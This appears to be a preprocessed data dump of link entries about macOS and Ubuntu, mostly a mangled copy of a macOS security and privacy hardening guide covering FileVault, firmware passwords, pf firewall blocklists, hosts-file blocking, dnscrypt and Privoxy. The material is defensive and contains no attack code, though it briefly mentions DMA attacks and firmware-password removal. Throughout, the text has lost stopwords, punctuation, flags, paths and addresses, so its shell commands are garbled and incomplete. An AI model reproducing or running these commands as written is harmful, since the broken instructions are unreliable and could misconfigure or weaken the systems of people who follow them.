downloaded apple ubuntu play anything ubuntu come proprietary decoder dvd audio installed ease please see article step install software dvd playback codecs networking networking adjusted similar way dropdown menu top right allows picking wifi access point changing network access also system setting configure advanced networking including vpn proxy dns setting web browsing ubuntu come firefox default major web browser universally available look nearly identical operating system safari apple web browser available ubuntu emailing ubuntu come thunderbird default email program similar functionality apple mail program highly configurable plugins calendar added address book synced look feel customized plugins lightning thunderbird conversation gcontactsync common one installed evolution another free email client look feel like apple mail program communicating friendscoworkers many communication program available operating system skype slack google hangout hip chat others available ubuntu also program called pidgin included ubuntu connect irc aol im many others within program working image ubuntu several powerful image manipulation program gimp darktable inkscape adobe product plus free huge bonus adobe product currently run ubuntu plenty replacement software option document editing libre office included default ubuntu similar open office bit learning curve coming microsoft program functionality libre office open save document spreadsheet presentation microsoft format document saved open document format translate better direction proprietary format issue fewer fewer time managing music spotify fully supported ubuntu operating system along web based player pandora google music ubuntu also come rhythmbox replacement apple itunes clementine another open source cross platform tool provides awesome music library experience although itunes run ubuntu music library moved several program available music editing mixing djing well including audacity mixxx ardour playing game steam ubuntu gaining game library every day many popular game found steam program including several find anywhere else may every top game shortage entertainment found ubuntu software center also collection free game every level gamer installing steam writing software anyone familiar writing software mac home writing software ubuntu atom sublime editor available system compiler used directly many web application including apache run natively ubuntu without need virtual machine working terminal used apple terminal ubuntu terminal feel right home brew package manager quickly translates apt package manager many command slightly different
497,Lobsters,mac,Apple macOS,Primitive for macOS,https://primitive.lol/,primitive macos,,user provides image input program try find optimal shape drawn maximize similarity target image drawn image repeat process adding one shape time using process program recreate photo surprisingly shape quite cpu intensive primitive optimized quickly possible output inherently vectorbased
498,Lobsters,mac,Apple macOS,Demystifying the i-Device NVMe NAND,http://ramtin-amin.fr/#nvmepcie,demystifying idevice nvme nand,nand dumping sim card misc telco protocol,nand dumping sim card misc telco protocol
499,Lobsters,mac,Apple macOS,A practical guide to securing macOS,https://github.com/drduh/macOS-Security-and-Privacy-Guide,practical guide securing macos,open issue 简体中文 basic preparing installing macos recovery mode macos mojave app store verifying installation integrity code signed creating bootable usb installer create bootable installer macos bootable usb installer creating install image note appear work custom install image restored magervalpautodmg manual way note show package content content sharedsupport verify installesdhashescsv notpeterappleinstallerchecksums target disk mode target disk mode target disk mode securely erase disk utility creating recovery partition unless autodmg magervalpcreaterecoverypartitioninstaller recoveryhdupdatedmg virtualization vmware fusion recovery mode note first boot note late macbooks require online o activation clear nvram setup assistant strong password computer name local hostname system preference sharing system activation io future macos freedom security privacy increasingly hostile global environment admin standard user account weakness exploited unlocked default apple others recommendation removed filevault caveat issue setup issue post full disk encryption filevault always prevents efficiently hardware secure onerng entropy random number generator fun encryption randomness system preference security privacy recovery key infiltrate vault security analysis decryption lion full disk encryption presentation ieee std xtsaes tweakable block cipher optional issue best practice deploying filevault lest remember cold boot attack encryption key note issue firmware set firmware password mac helpful laptop lost stolen pcileech spi programmer bus pirate recovery mode firmware password utility turn firmware password verify set password quit firmware utility dediprog apple new platform security page apple blog post longsoftuefitool chipsecchipsec issue firewall application layer firewall incoming outgoing firewall security privacy system preference stealth mode third party firewall little snitch hand radio silence lulu security growler incoming outgoing kernel extension silent mode root o vulnerability deletes network kernel extension programming guide shut snitch reverse engineering exploiting critical little snitch vulnerability kernel level packet filtering icefloor murus nat merit radb facebook fixmacosxnetmonitor drduhconfigscriptspfblocklistsh service note system integrity protection issue fixmacosxyosemitephonehome launchd launchdinfo apple daemon service programming guide technical note knockknock note single user mode console activity monitor optional cirrusjgithubioyosemitestoplaunch provisioning o x disabling unnecessary service mac osx startup spotlight suggestion spotlight suggestion bing web search fixmacosxcom note issue http homebrew homebrew apple great gpl purge note install homebrew fairly secure homebrew anonymous aggregate user behaviour analytics additional security option dns host file host file note freebsd configuration file dnsmasq dnscrypt jaybrowndnscryptmenu http dnscrypt server drduhdebianprivacyserverguide dnscrypt public server sample configuration file dnscryptproxy note dns leak mdnsresponder manual page dnsmasq dnsmasq provided isp google dns opendns optional dnssec iana website dnssecnet website drduhconfigdnsmasqconf drduhconfigdomains privileged port system preference network dns note issue drduhconfigscriptsmacosdnssh captive portal apple secret wispr request disable captive portal window mac o lion undocumented change captive network assistant setting o x yosemite certificate authority certification authority trust tracker analysis http certificate ecosystem needing removing unused certificate trust store keychain access system root never trust man middle possible openssl note may date current secure transport deprecated cryptographic service guide surprise issue comparison tl implementation ssl qualys ssl lab tool curl secure transport drduhconfigcurlrc man page web privoxy privoxy note silvesterorguk sourceforge secure http system preference network advanced proxy optional http http pp drduhconfigprivoxyconfig drduhconfigprivoxyuseraction redirecting blocked request browser sop chrome mozilla firefox google chrome safari tor browser firefox mozilla firefox quantum photon rust bug bounty program drduhconfiguserjs pyllyukkouserjs ghacksuserjsghacksuserjs noscript tracking protection container web extension sdk paper web extension api note issue drduhconfigfirefoxuserjs chrome google chrome chromium project proprietary component pdf viewer chrome downloaded google website rlz identifier dollar lifetime fee nodejs chrome electron separate profile sandboxing frequent update impressive credential bounty project zero ublock origin httpseverywhere dns prefetching dns prefetching privacy implication may attempt chromium security chromium privacy google privacy policy google service account setting safari safari webkit blink content blocker intelligent tracking prevention bounty program presentation blackhat developer subscription icloud keychain safari technology preview dgrahamkablock web browser closed source poorly maintained bug private life chromium browser brave web browser privacy navigator howto privacy security conscious browsing browserleakscom eff panopticlick disable thirdparty cooky webrtc ublock origin rentamobwebrtcleakprevent system hack plugins adobe flash oracle java adobe reader microsoft silverlight security risk hacking team flash zeroday java trojan backdoorflashback acrobat reader security vulnerability angling silverlight exploit tor tor project verify signature package encrypted exit node tor protocol specification tortlshistory pluggable transport sricslstegotorus tor relay bridge virtualbox vmware gnulinux bsd anonymity correlation seeking anonymity internet panopticon traffic correlation tor realistic adversary invisible internet project tor comparison vpn connection metadata split tunnel drduhdebianprivacyserverguide pptp openvpn wireguard linux vm cross platform tool sarfatavoodooprivacy issue technical overview eddie pritunl pgpgpg gnu privacy guard symmetrically asymmetrically gpg suite drduhconfiggpgconf drduhyubikeyguide online guide practice otr offtherecord xmpp adium profanity aglxmppclient coyim offtherecord communication use pgp virus malware everincreasing java bundling ask toolbar macbackdooriworm malwarebytes antimalware mac method malware persistence mac o x malware persistence o x yosemite knock knock block block ostiarius issue maclaunchsh antivirus advanced novice sophail applied attack antivirus analysis exploitation eset vulnerability trivial avast rce popular security software came relentless nsa gchq attack israel caught russian hacker scouring world u secret avg web tuneup extension multiple critical vulnerability common sense issue example safe mac malwarebytes blog virustotal hacking team root installation macos support driver mac agent rcs agent mac brief analysis rcs implant installer reverseputas system integrity protection system integrity protection disabled new o x rootless feature el capitan really sip disabled enable sip gatekeeper xprotect gatekeeper quarantine xprotect mac malware guide mac o x protect gatekeeper xprotect quarantine attribute note clear file make immutable metadata artifact hf extended attribute quicklook cache may leak encrypted data password keychain access anderspwgen derived key breaking o x keychain encrypt drduhpurse drduhpwdsh two factor authentication yubikey drduhyubikeyguide trmmnetyubikey yubico zero set backup yubikey disk utility tresorit spideroak arq espionage restic wifi system preference network advanced signal crowd uncovering social relationship smartphone probe wifi told everything spoof mac address note secure ssh set hashing drduhconfigsshconfig encrypted tunnel sock proxy system preference sharing hardening drduhconfigsshdconfig physical access thunderstrike usbkill privacy filter nail polish system monitoring openbsm audit note ilostmynotesblogspotcom derflounderwordpresscom dtrace note system integrity protection interferes execution activity monitor network wireshark bonzaithepenguinloading binary whitelisting googlesanta kernel authorization api note release zentral note miscellaneous diagnostics usage data music video vlc medium player torrent transmission malware may still find way best blocklist transmission duti protecting sparklegate console ttytickets flag secure keyboard entry yubikey textexpander multicast advertisement disable handoff sandboxing fg sandbox guide seatbelt profile custom umask related software cisofylynis dylib hijack scanner fsecure xfence little flocker lockdown zentral facebookosquery googlegrr jipegitosxauditor kristovatlasosxconfigcheck libyallibfvde stronghold yelposxcollector eclectic light company downloads additional resource,guide collection technique improving security privacy modern apple macintosh computer macbook running recent version macos formerly known o x guide targeted power user wish adopt enterprisestandard security also suitable novice user interest improving privacy security mac system secure administrator capable making one single technology software technique guarantee perfect computer security modern operating system computer complex requires numerous incremental change meaningfully improve one security privacy posture guide provided basis without warranty kind responsible break anything get sort trouble following guide suggest improvement please send pull request open issue guide also available 简体中文 basic standard security best practice apply preparing installing macos several way install macos simplest way boot recovery mode holding command r key boot system image downloaded applied directly apple however way expose serial number identifying information network plain text may desired privacy reason packet capture unencrypted http conversation macos recovery alternative way install macos first download macos mojave app store elsewhere create custom installable system image verifying installation integrity macos installation application code signed verified make sure received legitimate copy using pkgutil checksignature codesign dvv command verify code signature integrity macos application bundle pkgutil checksignature applicationsinstall macos catalinaapp package install macos catalina status signed certificate trusted mac o x certificate chain software signing fingerprint cd bf apple code signing certification authority fingerprint ff ac apple root ca fingerprint ff df use codesign command examine application code signature codesign dvv applicationsinstall macos catalinaapp executableapplicationsinstall macos catalinaappcontentsmacosinstallassistantspringboard identifiercomappleinstallassistantcatalina formatapp bundle macho thin codedirectory libraryvalidation locationembedded platform signature authoritysoftware signing authorityapple code signing certification authority authorityapple root ca infoplist teamidentifiernot set sealed resource internal requirement creating bootable usb installer instead booting network using target disk mode bootable macos installer made createinstallmedia utility included contentsresources folder installer application bundle see create bootable installer macos run utility without argument see work create bootable usb installer mount usb drive erase partition use createinstallmedia utility diskutil list find disk matching correct size usually last disk eg diskutil unmountdisk diskutil partitiondisk jhfs installer cd applicationsinstall macos catalinaapp sudo contentsresourcescreateinstallmedia volume volumesinstaller nointeraction erasing disk copying disk making disk bootable copying boot file install medium available volumesinstall macos catalina creating install image note apple autodmg installer appear work across o version want build image example following step must performed macos create custom install image restored mac using usbc cable target disk mode example use magervalpautodmg manual way note following instruction appear work macos version find installesddmg inside installation application locate terminal finder right click application bundle select show package content navigate content sharedsupport find file installesddmg verify file integrity comparing hash others found installesdhashescsv notpeterappleinstallerchecksums determine macos version build originally shipped available mac see shasum installesddmg mount install operating system temporary image hdiutil attach mountpoint tmpinstallesd installesddmg hdiutil create size type sparse f hfsj volname macos uid gid mode tmpmacossparseimage hdiutil attach mountpoint tmpmacos owner tmpmacossparseimage sudo installer pkg tmpinstallesdpackagesosinstallmpkg tgt tmpmacos verbose installer o install started installation take patient use tail f varloginstalllog another terminal monitor progress check error installation complete detach convert verify image hdiutil detach tmpmacos unmounted ejected hdiutil detach tmpinstallesd unmounted ejected hdiutil convert format udzo tmpmacossparseimage sierradmg preparing imaging engine asr imagescan source sierradmg file sierradmg ready applied target disk mode bootable usb installer booting network recovery mode image could customized include provisioned user installed application preference example target disk mode use target disk mode boot mac wish image holding key connect another mac using usbc thunderbolt firewire cable nt another mac boot usb installer sierradmg required file copied holding option key boot use command diskutil list identify disk connected mac usually optionally securely erase disk single pas previously filevaultencrypted disk must first unlocked mounted sudo diskutil secureerase freespace partition disk journaled hf sudo diskutil unmountdisk sudo diskutil partitiondisk jhfs macos restore image new volume making sure disk erased sudo asr restore source sierradmg target volumesmacos erase buffersize erase content volumesmacos ny disk utility application may also used erase connected disk restore sierradmg newly created partition transfer file copy shared folder like usersshared mounted disk image eg cp volumesmacosusersshared finished restore install usb recovery boot creating recovery partition unless built image autodmg installed macos second partition mac need create recovery partition order use full disk encryption using magervalpcreaterecoverypartitioninstaller manually following step download recoveryhdupdatedmg verify integrity shasum recoveryhdupdatedmg recoveryhdupdatedmg attach expand installer run ensuring volumesmacos path newly created partition connected disk hdiutil attach recoveryhdupdatedmg pkgutil expand volumesmac o x lion recovery hd updaterecoveryhdupdatepkg tmprecovery hdiutil attach tmprecoveryrecoveryhdupdatepkgrecoveryhdmetadmg tmprecoveryrecoveryhdupdatepkgscriptstoolsdmtest ensurerecoverypartition volumesmacos volumesrecovery hd updatebasesystemdmg volumesrecovery hd updatebasesystemchunklist creating recovery partition finished run diskutil list make sure recovery hd exists eject disk hdiutil unmount volumesmacos power target disk modebooted mac virtualization install macos virtual machine vm using vmware fusion follow instruction create image need download create recovery partition manually installation method select install macos recovery partition customize memory cpu requirement complete setup guest vm boot recovery mode default note virtual machine boot due kernel panic adjust memory process resource setting recovery mode select language select utility terminal menu bar guest vm type ifconfig grep inet see private address like host mac type ifconfig grep inet see private gateway address like host mac able ping equivalent guest vm address host mac serve installable image guest vm editing adding following line top using gateway address assigned host mac port listen host mac link image default apache web server directory sudo ln sierradmg librarywebserverdocuments host mac start apache foreground sudo httpd x guest vm install disk image volume local network using asr asr restore source http target volumesmacintosh hd erase buffersize validating target done validating source done erase content volumesmacintosh hd ny retrieving scan information done validating size done restoring verifying remounting target volume done finished stop apache web server host mac pressing control c sudo httpd x window remove image copy sudo rm librarywebserverdocumentssierradmg guest vm select startup disk menubar topleft select hard drive restart may wish disable network adapter vmware configure guest vm initially take restore saved guest vm snapshot attempting risky browsing example use guest vm install operate questionable software first boot note setting macos consider disconnecting networking configuring firewall first however late macbooks touch bar hardware require online o activation also see next section first boot hold command option p r key clear nvram macos first start greeted setup assistant creating first account use strong password without hint enter real name account setup process aware computer name local hostname comprise name eg john appleseed macbook thus appear local network various preference file verified updated needed system preference sharing following command installation sudo scutil set computername macbook sudo scutil set localhostname macbook system activation word privacy implication activating touch bar macbook device friendly anonymous security researcher apple increasingly seems despite vague claim contrary increasingly interested merging unifying two os constantly rumor fundamental change macos make far like io macos old apple introduction armbased coprocessors running iossepos first processor touchbar macbook pro run touchbar implement nfcapplepay add biometric login using sep verify firmware integrity imac pro implementsverifies embedded device firmware implement secure boot etc seems cement concern basically render using macos device without sending metadata apple difficult impossible io device always required activation first boot battery gone dead initializes sepos proceed verified boot first boot activation initializes sepos discussed sends metadata apple carrier via apple cellular device activate baseband sim activation process first boot first boot long list highly sensitive metadata sent hashed note hashing give privacy apple since link exact metadata payment information purchase apple return personalized response required secure boot complete particularly worrying process networklinked secure boot process centralized external server power dictate device boot equally significant privacy concern device constantly sending metadata activation applelinkedhosted activity linking ip address strongly real identity based purchase payment information cellular device metadata collected sim etc unless connection blocked network level possible selfmanaged infrastructure ie cellular basically render using device impossible since simply installing application requires sending device metadata apple activation verification mechanism designed specifically rely unique device identifier associated payment information purchase actively associated continuing basis apple every applehosted service device interacts apple idbased service softwareupdate imessage facetime etc ability invitation apple silently send targeted malicious update device matching specific unique id criterion valid concern something dismissed unlikely especially given apple full compliance recently implemented chinese authoritarian nonauthoritarian country national security law io start designed little enduser control way endusers configure device according wish maintaining security relies heavily new closed source code macos history designed surface similar fashion power enterprise user moment still configure device relatively securely maintaining basically zero network interaction apple installation third party softwarekernel extension completely control network stack intercept filesystem event perprocess basis macos despite good deal closed source code designed different period apple history designed line open source standard designed configurable controllable enterprisepower user introduction coprocessors mac device increasing security many way brings issue io discussed mean running mac device securely complete user control without forced network interaction apple mothership highly sensitive corporate environment problematic risky given author unaware exact hardware configuration coprocessors following may inaccurate however given lowlevel nature coprocessors would surprise author coprocessors already eventually separate network access independent intel cpu indication suggest currently case unclear lead concern similar many raised around intel meamt course mac device also intel cpu one could argue coprocessors increase security many way case user security malicious apple lack configurability key issue apple could introduced secure boot firmware protection without making require network access without making verification linked deviceunique id without introducing enormous amount potentially exploitable code protect much smaller highly exploitable codebase running coprocessor highly privileged position board give immense power adversary manufacturer compliance targeted attack ongoing concern worst case scenario could potentially represent end mac independent enduser controllable relatively secure system appropriate sensitive environment strict network security policy io future macos freedom security privacy increasingly hostile global environment admin standard user account first user account always admin account admin account member admin group access sudo allows usurp account particular root give effective control system program admin executes potentially obtain access making security risk utility like sudo weakness exploited concurrently running program many pane system preference unlocked default pdf p admin account considered best practice apple others pdf p use separate standard account daytoday work use admin account installation system configuration strictly required ever log admin account via macos login screen system prompt authentication required terminal rest end apple provides recommendation hiding admin account home directory elegant solution avoid visible ghost account admin account also removed filevault additional hardening caveat administrator install application application local directory finder installer prompt standard user authentication dialog many application installed application instead directory created manually rule thumb application require admin access complain installed application installed user directory rest local directory mac app store application still installed application require additional authentication sudo available shell standard user requires using su login enter shell admin account make maneuver trickier requires basic experience commandline interface system preference several system utility eg wifi diagnostics require root privilege full functionality many panel system preference locked need unlocked separately clicking lock icon application simply prompt authentication upon opening others must opened admin account directly get access function eg console thirdparty application work correctly assume user account admin program may executed logging admin account using open utility see additional discussion issue setup account created managed system preference settled system generally easier create second admin account demote first account avoids data migration newly installed system also add standard account demoting account done either new admin account system preference account must logged executing command may necessary execute see issue sudo dscl delete groupsadmin groupmembership username sudo dscl delete groupsadmin groupmembers generateduid find generateduid account dscl read user username generateduid see also post information macos determines group membership full disk encryption filevault provides full disk technically full volume encryption macos filevault encryption protects data rest hardens always prevents someone physical access stealing data tampering mac much cryptographic operation happening efficiently hardware performance penalty filevault noticeable like cryptosystems security filevault greatly depends quality pseudo random number generator prng random device implement yarrow pseudo random number generator algorithm maintains entropy pool additional entropy fed generator regularly securityserver daemon random jitter measurement kernel see man random information turning filevault system preference installing macos rather creating encrypted partition installation first secure prng entropy available additionally prng manually seeded entropy writing devrandom enabling filevault done simply using mac little activating filevault may also possible increase entropy external source like onerng see entropy random number generator fun encryption randomness information enable filevault sudo fdesetup enable system preference security privacy reboot remember password reason save recovery key however encrypted data lost forever without either password recovery key learn filevault work see paper infiltrate vault security analysis decryption lion full disk encryption pdf related presentation pdf also see ieee std xtsaes tweakable block cipher pdf optional enforce system hibernation evict filevault key memory instead traditional sleep memory sudo pmset destroyfvkeyonstandby sudo pmset hibernatemode computer firmware type efi bios help discovery hardware component ultimately properly bootstrap computer using desired o instance case apple hardware use efi apple store relevant information within efi aid functionality macos example filevault key stored efi transparently come standby mode organization especially sensitive highattack environment potentially exposed full device access device standby mode mitigate risk destroying filevault key firmware nt destroy use filevault simply requires user enter password order system come standby mode choose evict filevault key standby mode also modify standby power nap setting otherwise machine may wake standby mode power due absence filevault key see issue information setting changed sudo pmset powernap sudo pmset standby sudo pmset standbydelay sudo pmset autopoweroff information see best practice deploying filevault pdf paper lest remember cold boot attack encryption key pdf note apfs may make evicting filevault key redundant see discussion link issue firmware setting firmware password prevents mac starting device startup disk may also set required boot may useful mitigating attack require physical access hardware see set firmware password mac official documentation feature helpful laptop lost stolen protects direct memory access dma attack read filevault password inject kernel module pcileech way reset firmware password apple store using spi programmer bus pirate flash ic programmer start pressing command r key boot recovery mode mode recovery window appears choose firmware password utility utility menu firmware utility window appears select turn firmware password enter new password enter password verify field select set password select quit firmware utility close firmware password utility select restart shutdown apple menu topleft corner firmware password activate next boot validate password hold alt boot prompted enter password firmware password also managed firmwarepasswd utility booted o example prompt firmware password attempting boot different volume sudo firmwarepasswd setpasswd setmode command verify firmware password sudo firmwarepasswd verify verifying firmware password enter password correct firmware password may bypassed determined attacker apple physical access computer using dediprog dump flash macbook spi flash chip remove firmware password sans apple macos catalina firmwarepasswd program new option disableresetcapability according apple new platform security page effectively prevents firmware password reset even apple user want one remove firmware password software mean disableresetcapability option added firmwarepasswd commandline tool macos setting option user must acknowledge password forgotten need removal user must bear cost motherboard replacement necessary achieve newer mac model mac pro imac pro macbook touchbar apple chip provide secure enclave encrypted key lessen risk efi firmware attack see blog post information see longsoftuefitool chipsecchipsec discussion issue information firewall several type firewall available macos application layer firewall builtin basic firewall block incoming connection firewall ability monitor block outgoing connection controlled firewall tab security privacy system preference following command enable firewall logging stealth mode sudo usrlibexecapplicationfirewallsocketfilterfw setglobalstate firewall enabled state sudo usrlibexecapplicationfirewallsocketfilterfw setloggingmode turning log mode sudo usrlibexecapplicationfirewallsocketfilterfw setstealthmode stealth mode enabled computer hacker scan network attempt identify computer attack prevent computer responding scan using stealth mode stealth mode enabled computer respond icmp ping request answer connection attempt closed tcp udp port make difficult attacker find computer prevent builtin software well codesigned downloaded software whitelisted automatically sudo usrlibexecapplicationfirewallsocketfilterfw setallowsigned disabled allow signed builtin application automatically sudo usrlibexecapplicationfirewallsocketfilterfw setallowsignedapp disabled allow signed downloaded application automatically application signed valid certificate authority automatically added list allowed apps rather prompting user authorize apps included macos signed apple allowed receive incoming connection setting enabled example since itunes already signed apple automatically allowed receive incoming connection firewall run unsigned app listed firewall list dialog appears option allow deny connection app choose allow macos sign application automatically add firewall list choose deny macos add list denies incoming connection intended app interacting socketfilterfw restart process sending line hangup signal sudo pkill hup socketfilterfw third party firewall program little snitch hand radio silence lulu security growler provide good balance usability security program capable monitoring blocking incoming outgoing network connection however may require use closed source kernel extension number choice allowingblocking network connection overwhelming use silent mode connection allowed periodically check configuration gain understanding application worth noting firewall bypassed program running root o vulnerability pdf still worth nt expect absolute protection however malware actually deletes nt execute little snitch security software installed little snitch work see network kernel extension programming guide shut snitch reverse engineering exploiting critical little snitch vulnerability kernel level packet filtering highly customizable powerful also complicated firewall exists kernel controlled pfctl various configuration file pf also controlled gui application icefloor murus many book article subject pf firewall one example blocking traffic ip address add following file called pfrules wifi ether set blockpolicy drop set fingerprint etcpfos set rulesetoptimization basic set skip scrub nodf table blocklist persist block log block log quick noroute block log wifi blocklist block log wifi blocklist antispoof quick wifi ether pas proto tcp wifi ether keep state pas proto udp wifi ether keep state pas proto icmp wifi keep state use following command manipulate firewall sudo pfctl e f pfrules enable firewall load configuration sudo pfctl disable firewall sudo pfctl blocklist add add ip address blocklist sudo pfctl blocklist show view blocklist sudo ifconfig create create interface logging sudo tcpdump ni view filtered packet unless already familiar packet filtering spending much time configuring pf recommended also probably unnecessary mac behind nat secure home network possible use pf firewall block network access entire range network address example whole organization query merit radb list network use autonomous system like facebook whois h whoisradbnet copy paste list network returned blocklist command sudo pfctl blocklist add confirm address added sudo pfctl blocklist show altq support kernel altq related function disabled confirm network traffic blocked address note dns request still work dig short facebookcom curl connecttimeout http facebookcom trying tcpnodelay set connection timed millisecond closing connection curl connection timed millisecond sudo tcpdump tqni host ip tcp ip tcp ip tcp ip tcp ip tcp outgoing tcp syn packet blocked tcp connection established thus web site effectively blocked ip layer use pf audit phone home behavior user systemlevel process see fixmacosxnetmonitor see drduhconfigscriptspfblocklistsh inspiration service note system integrity protection allow disabling system service recent macos version either temporarily disable sip disable service recovery mode see issue information see fixmacosxyosemitephonehome recommendation service macos managed launchd see launchdinfo well apple daemon service programming guide technical note also run knockknock show information startup item use launchctl list view running user agent use sudo launchctl list view running system daemon specify service name examine eg launchctl list comapplemapsmapspushd use default read examine job plists systemlibrarylaunchdaemons systemlibrarylaunchagents use man string find agentdaemon example learn system launch daemon agent start default read systemlibrarylaunchdaemonscomappleapsdplist look program programarguments section see binary run case apsd find information look man page man apsd example interested apple push notification disable service sudo launchctl unload w systemlibrarylaunchdaemonscomappleapsdplist note unloading service may break usability application read manual page use google make sure understand first careful disabling system daemon nt understand may render system unbootable break mac use single user mode fix use console activity monitor application notice mac heating feeling sluggish generally misbehaving may resulted tinkering view status service find vardbcomapplexpclaunchd type f print exec default read devnull annotated list launch daemon agent respective program executed program hash sum included repository optional run readlaunchplistspy script diff output check discrepancy system eg diff python readlaunchplistspy sort cat sort see also cirrusjgithubioyosemitestoplaunch description service provisioning o x disabling unnecessary service another explanation persistent login item may also exist directory librarylaunchagents librarylaunchdaemons libraryscriptingadditions librarystartupitems systemlibrarylaunchagents systemlibrarylaunchdaemons systemlibraryscriptingadditions systemlibrarystartupitems librarylaunchagents librarypreferencescomappleloginitemsplist see mac osx startup pdf information spotlight suggestion disable spotlight suggestion spotlight preference safari search preference avoid search query sent apple also disable bing web search spotlight preference avoid search query sent microsoft see fixmacosxcom detailed instruction upgraded o x yosemite using default setting time start typing spotlight open application search file computer local search term location sent apple third party including microsoft note web site instruction may longer work macos sierra see issue comparison window see http homebrew consider using homebrew make software installation easier update userland tool see apple great gpl purge note already installed xcode command line tool use xcodeselect install download install check apple developer site install homebrew mkdir homebrew curl l http githubcomhomebrewbrewtarballmaster tar xz strip c homebrew edit path shell shell rc file use homebrewbin homebrewsbin example echo path path homebrewsbin homebrewbin zshrc change login shell z shell chsh binzsh open new terminal window run brew update homebrew us ssltls talk github verifies integrity downloaded package fairly secure remember periodically run brew update brew upgrade trusted secure network download install software update get information package installation run brew info package check recipe online according homebrew anonymous aggregate user behaviour analytics homebrew gather anonymous aggregate user behaviour analytics reporting google analytics opt homebrew analytics set export environment shell rc file use brew analytics may also wish enable additional security option homebrewcaskopts requiresha dns host file use host file block known malware advertising otherwise unwanted domain edit host file root example sudo vi etchosts host file also managed gui app block domain record append one following line etchosts examplecom examplecom examplecom note us aaaa dns record type rather record type may also want block connection also including examplecom entry like shown many list domain available online paste make sure line start line localhost included popular useful host list append list host tee command confirm nonroutable address comment added curl http rawgithubusercontentcomstevenblackhostsmasterhosts sudo tee etchosts wc l etchosts egrep etchosts sort uniq egrep e output see man host freebsd configuration file information see dnsmasq section guide host blocking option dnscrypt encrypt outgoing dns traffic consider using combination dnsmasq dnssec integrity authenticity dns traffic greatly improved jaybrowndnscryptmenu provide graphical user interface dnscrypt install dnscrypt homebrew follow instruction configure start dnscryptproxy brew install dnscryptproxy using combination dnsmasq find file homebrewmxcldnscryptproxyplist running brew info dnscryptproxy show location like usrlocaletcdnscryptproxytoml open text editor find line starting listenaddresses edit line use dnscrypt port like listenaddresses start dnscrypt sudo brew service restart dnscryptproxy make sure dnscrypt running sudo lsof c pni command pid user fd type device sizeoff node name dnscryptproxy nobody udp dnscryptproxy nobody udp dnscryptproxy nobody udp dnscryptproxy nobody udp default dnscryptproxy run localhost port nobody user using resolvers specified http would like change setting edit configuration file eg listenaddresses username url etc accomplished editing usrlocaletcdnscryptproxytoml described run dnscrypt server see also drduhdebianprivacyserverguide dnscrypt trusted location use one many public server instead confirm outgoing dns traffic encrypted sudo tcpdump qtni ip udp length ip udp length dig short x dnscryptproxy also capability blacklist domain including use wildcards see sample configuration file dnscryptproxy option note application program may resolve dns using provided server dnscryptproxy used possible disable nondnscrypt dns traffic following pf rule block drop quick proto udp port block drop quick proto tcp port see also dns leak mdnsresponder manual page dnsmasq among feature dnsmasq able cache reply prevent upstream query unqualified name block entire toplevel domain name use combination dnscrypt additionally encrypt outgoing dns traffic nt wish use dnscrypt least use dns provided isp two popular alternative google dns opendns optional dnssec set extension dns provide dns client resolvers origin authentication dns data authenticated denial existence data integrity answer dnssec protected zone digitally signed signed record authenticated via chain trust starting set verified public key dns rootzone current rootzone trust anchor may downloaded iana website number resource dnssec probably best one dnssecnet website install dnsmasq dnssec optional brew install dnsmasq withdnssec download drduhconfigdnsmasqconf curl homebrewetcdnsmasqconf http rawgithubusercontentcomdrduhconfigmasterdnsmasqconf edit file examine option block entire level domain append drduhconfigdomains rule install start program sudo required bind privileged port sudo brew service start dnsmasq set dnsmasq local dns server open system preference network select active interface dns tab select add use sudo networksetup setdnsservers wifi make sure dnsmasq correctly configured scutil dns head dns configuration resolver search domain whatever nameserver flag request record request aaaa record reach reachable local address directly reachable address networksetup getdnsservers wifi note vpn software override dns setting connect see issue drduhconfigscriptsmacosdnssh test dnssec validation test dnssec validation succeeds signed zone reply noerror status contain ad flag dig dnssec icannorg header opcode query status noerror id flag qr rd ra ad query answer authority additional test dnssec validation fails zone signed improperly reply servfail status dig wwwdnssecfailedorg header opcode query status servfail id flag qr rd ra query answer authority additional captive portal macos connects new network check internet connectivity may launch captive portal assistant utility application attacker could trigger utility direct mac site malware without user interaction best disable feature log captive portal using regular web browser navigating nonsecure http page accepting redirect captive portal login interface disabling custom proxy dns setting sudo default write librarypreferencessystemconfigurationcomapplecaptivecontrolplist active bool false also see apple secret wispr request disable captive portal window mac o lion undocumented change captive network assistant setting o x yosemite certificate authority macos come root authority certificate installed forprofit corporation like apple verisign thawte digicert government agency china japan netherlands u certificate authority ca capable issuing ssltls certificate domain code signing certificate etc information see certification authority trust tracker analysis http certificate ecosystem pdf needing removing unused certificate trust store pdf inspect system root certificate keychain access system root tab using security command line tool systemlibrarykeychainssystemrootcertificateskeychain file disable certificate authority keychain access marking never trust closing window risk man middle attack coerced compromised certificate authority trusted system issue fakerogue ssl certificate quite low still possible openssl note section may date version openssl sierra current nt support tl newer elliptic curve cipher since apple official supported tl library macos secure transport openssl deprecated considered deprecated according cryptographic service guide apple version openssl may also patch may surprise going use openssl mac download install recent version openssl brew install openssl note linking brew used favor usrbinopenssl may interfere builtin software see issue compare tl protocol cipher homebrew version system version openssl homebrewbinopenssl version echo homebrewbinopenssl sclient connect grep sslsession openssl sep sslsession protocol cipher usrbinopenssl version echo usrbinopenssl sclient connect grep sslsession openssl jan sslsession protocol cipher see also comparison tl implementation ssl qualys ssl lab tool curl version curl come macos us secure transport ssltls validation prefer use openssl install brew install curl withopenssl ensure default brew link force curl download drduhconfigcurlrc see man page curl curlrc http rawgithubusercontentcomdrduhconfigmastercurlrc web privoxy consider using privoxy local proxy filter web browsing traffic note macos proxy setting universal apps service may honor system proxy setting ensure application wish proxy correctly configured manually verify connection nt leak additionally may possible configure pf firewall transparently proxy traffic signed installation package privoxy downloaded silvesterorguk sourceforge signed package secure homebrew version attracts full support privoxy project alternatively install start privoxy using homebrew brew install privoxy brew service start privoxy default privoxy listens localhost tcp port set system http proxy active network interface done system preference network advanced proxy sudo networksetup setwebproxy wifi optional set system http proxy still allows domain name filtering sudo networksetup setsecurewebproxy wifi confirm proxy set scutil proxy dictionary exceptionslist array local ftppassive httpenable httpport httpproxy visit http pp browser curl curl http pp ok contentlength contenttype texthtml cachecontrol nocache privoxy already come many good rule however also write download drduhconfigprivoxyconfig drduhconfigprivoxyuseraction get started curl homebrewetcprivoxyconfig http rawgithubusercontentcomdrduhconfigmasterprivoxyconfig curl homebrewetcprivoxyuseraction http rawgithubusercontentcomdrduhconfigmasterprivoxyuseraction restart privoxy verify traffic blocked redirected sudo brew service restart privoxy curl adsfoocom il request blocked privoxy contenttype imagegif contentlength cachecontrol nocache curl imgurcom il local redirect privoxy location http imgurcom contentlength ok contenttype texthtml replace ad image picture kitten example starting local web server redirecting blocked request localhost browser web browser pose largest security privacy 